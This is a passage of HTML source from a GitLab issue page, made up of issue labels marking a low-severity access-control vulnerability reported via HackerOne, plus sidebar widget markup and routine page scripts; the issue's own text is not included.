milestone.&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2016-11-18T17:02:50.145Z&quot;,&quot;updated_at&quot;:&quot;2019-04-17T18:49:16.998Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3417347,&quot;title&quot;:&quot;HackerOne&quot;,&quot;color&quot;:&quot;#0033CC&quot;,&quot;description&quot;:&quot;&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2018-01-31T13:53:42.609Z&quot;,&quot;updated_at&quot;:&quot;2019-01-09T12:13:21.325Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:16845059,&quot;title&quot;:&quot;Weakness::CWE-284&quot;,&quot;color&quot;:&quot;#7F8C8D&quot;,&quot;description&quot;:&quot;Improper Access Control - Generic&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2020-10-27T18:02:21.437Z&quot;,&quot;updated_at&quot;:&quot;2020-10-27T18:02:21.437Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:2492649,&quot;title&quot;:&quot;backend&quot;,&quot;color&quot;:&quot;#D10069&quot;,&quot;description&quot;:&quot;Issues that require backend work&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-08-15T14:49:42.004Z&quot;,&quot;updated_at&quot;:&quot;2018-06-11T10:34:33.030Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:4107753,&quot;title&quot;:&quot;bug::vulnerability&quot;,&quot;color&quot;:&quot;#CC0000&quot;,&quot;description&quot;:&quot;A security vulnerability&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2018-05-22T15:15:09.960Z&quot;,&quot;updated_at&quot;:&quot;2022-03-16T11:32:16.336Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3103452,&quot;title&quot;:&quot;devops::create&quot;,&quot;color&quot;:&quot;#E44D2A&quot;,&quot;description&quot;:&quot;Issues for the Create stage of the DevOps lifecycle (e.g. Source Code Management, Design Management, Web IDE, Code Review, Gitter)&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-12-01T19:01:03.585Z&quot;,&quot;updated_at&quot;:&quot;2022-07-04T07:09:55.759Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:10309854,&quot;title&quot;:&quot;group::source code&quot;,&quot;color&quot;:&quot;#A8D695&quot;,&quot;description&quot;:&quot;Issues belonging to the Source Code group of the Create stage of the DevOps lifecycle. See https://about.gitlab.com/handbook/product/categories/#source-code-group&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2019-04-17T13:57:02.280Z&quot;,&quot;updated_at&quot;:&quot;2019-05-23T09:26:35.519Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3857543,&quot;title&quot;:&quot;priority::4&quot;,&quot;color&quot;:&quot;#008000&quot;,&quot;description&quot;:&quot;We don&#39;t have visibility when this will be addressed. See https://handbook.gitlab.com/handbook/engineering/infrastructure/engineering-productivity/issue-triage/#priority&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2018-04-13T08:05:19.216Z&quot;,&quot;updated_at&quot;:&quot;2024-04-01T13:24:05.529Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:31607339,&quot;title&quot;:&quot;project-templates&quot;,&quot;color&quot;:&quot;#ed9121&quot;,&quot;description&quot;:&quot;Instance-level, Group-level or Built-in Project Templates&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2023-09-07T19:21:15.093Z&quot;,&quot;updated_at&quot;:&quot;2023-09-07T19:21:15.093Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:14918378,&quot;title&quot;:&quot;section::dev&quot;,&quot;color&quot;:&quot;#F0AD4E&quot;,&quot;description&quot;:&quot;Issues related to the Dev section&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2020-05-11T22:11:57.167Z&quot;,&quot;updated_at&quot;:&quot;2020-05-11T22:11:57.167Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:2779335,&quot;title&quot;:&quot;security&quot;,&quot;color&quot;:&quot;#d9534f&quot;,&quot;description&quot;:&quot;Issues related to the security of GitLab or its dependencies. Please report vulnerabilities responsibly per https://about.gitlab.com/security/disclosure/&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-10-05T14:36:39.341Z&quot;,&quot;updated_at&quot;:&quot;2023-05-24T20:20:05.269Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3713900,&quot;title&quot;:&quot;severity::4&quot;,&quot;color&quot;:&quot;#008000&quot;,&quot;description&quot;:&quot;Low - applies to bugs and bug categories of availability, performance, security and ux. See https://handbook.gitlab.com/handbook/engineering/infrastructure/engineering-productivity/issue-triage/#severity&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2018-03-23T14:46:07.848Z&quot;,&quot;updated_at&quot;:&quot;2024-04-01T13:12:39.737Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:18798869,&quot;title&quot;:&quot;tw::triaged&quot;,&quot;color&quot;:&quot;#228B22&quot;,&quot;description&quot;:&quot;The Technical Writing effort for this has been identified, and no additional reminders are required from the bot.&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2021-02-23T17:20:45.112Z&quot;,&quot;updated_at&quot;:&quot;2021-02-23T17:20:45.112Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:2278648,&quot;title&quot;:&quot;type::bug&quot;,&quot;color&quot;:&quot;#cc0000&quot;,&quot;description&quot;:&quot;Issues that report undesirable or incorrect behavior. See https://handbook.gitlab.com/handbook/product/groups/product-analysis/engineering/metrics/#work-type-classification&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-07-07T20:20:34.868Z&quot;,&quot;updated_at&quot;:&quot;2024-11-08T09:52:16.699Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:28669354,&quot;title&quot;:&quot;workflow::complete&quot;,&quot;color&quot;:&quot;#428BCA&quot;,&quot;description&quot;:&quot;Applied after all MRs have merged and the issue has been verified if necessary&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2023-01-12T00:18:59.592Z&quot;,&quot;updated_at&quot;:&quot;2023-01-12T17:27:43.939Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false}]"></div>
<div class="block milestone" data-testid="sidebar-milestones">
<div class="js-sidebar-milestone-widget-root" data-can-edit="" data-issue-iid="416244" data-project-path="gitlab-org/gitlab"></div>
</div>
<div class="block" data-testid="iteration-container"><div class="js-sidebar-iteration-widget-root" data-can-edit="" data-group-path="gitlab-org" data-issue-id="129835514" data-issue-iid="416244" data-project-path="gitlab-org/gitlab"></div>
</div>
<div class="js-sidebar-weight-widget-root" data-can-edit="" data-issue-iid="416244" data-project-path="gitlab-org/gitlab"></div>

<div class="js-sidebar-due-date-widget-root"></div>
<div class="js-sidebar-time-tracking-root block">
<!-- / Fallback while content is loading -->
<div class="title hide-collapsed gl-flex gl-justify-between gl-items-center !gl-mb-0">
<span class="gl-font-bold">Time tracking</span>
<span class="gl-spinner-container" role="status"><span aria-hidden class="gl-spinner gl-spinner-sm gl-spinner-dark !gl-align-text-bottom"></span><span class="gl-sr-only !gl-absolute">Loading</span>
</span>
</div>
</div>
<div class="js-sidebar-health-status-widget-root" data-can-edit="" data-full-path="gitlab-org/gitlab" data-iid="416244" data-issuable-type="issue"></div>
<script id="js-confidential-issue-data" type="application/json">{"is_confidential":false,"is_editable":null}</script>
<div class="block">
<div class="hide-collapsed gl-flex gl-items-center gl-font-bold gl-leading-20 gl-text-default">
Confidentiality
</div>
<div class="hide-collapsed gl-text-subtle">
Confidentiality controls have moved to the issue actions menu (<svg class="s12 gl-align-middle" data-testid="ellipsis_v-icon"><use href="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg#ellipsis_v"></use></svg>) at the top of the page.
</div>
</div>

<div class="js-sidebar-participants-widget-root"></div>
</form><script class="js-sidebar-options" type="application/json">{"endpoint":"/gitlab-org/gitlab/-/issues/416244.json?serializer=sidebar_extras","toggleSubscriptionEndpoint":"/gitlab-org/gitlab/-/issues/416244/toggle_subscription","moveIssueEndpoint":"/gitlab-org/gitlab/-/issues/416244/move","projectsAutocompleteEndpoint":"/-/autocomplete/projects?project_id=278964","editable":"","currentUser":{},"rootPath":"/","fullPath":"gitlab-org/gitlab","iid":416244,"id":129835514,"severity":"unknown","timeTrackingLimitToHours":true,"canCreateTimelogs":null,"createNoteEmail":null,"issuableType":"issue","directlyInviteMembers":"false","weightOptions":["None","Any",0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20],"weightNoneValue":"None","multipleApprovalRulesAvailable":null}</script>
</div>
</aside>



</main>
</div>


</div>
</div>


<script nonce="OoQw4Jfj38gL2KrNEBLa5g==">
//<![CDATA[
if ('loading' in HTMLImageElement.prototype) {
  document.querySelectorAll('img.lazy').forEach(img => {
    img.loading = 'lazy';
    let imgUrl = img.dataset.src;
    // Only adding width + height for avatars for now
    if (imgUrl.indexOf('/avatar/') > -1 && imgUrl.indexOf('?') === -1) {
      const targetWidth = img.getAttribute('width') || img.width;
      imgUrl += `?width=${targetWidth}`;
    }
    img.src = imgUrl;
    img.removeAttribute('data-src');
    img.classList.remove('lazy');
    img.classList.add('js-lazy-loaded');
    img.dataset.testid = 'js-lazy-loaded-content';
  });
}

//]]>
</script>
<script nonce="OoQw4Jfj38gL2KrNEBLa5g==">
//<![CDATA[
gl = window.gl || {};
gl.experiments = {};


//]]>
</script>

</body>
</html>

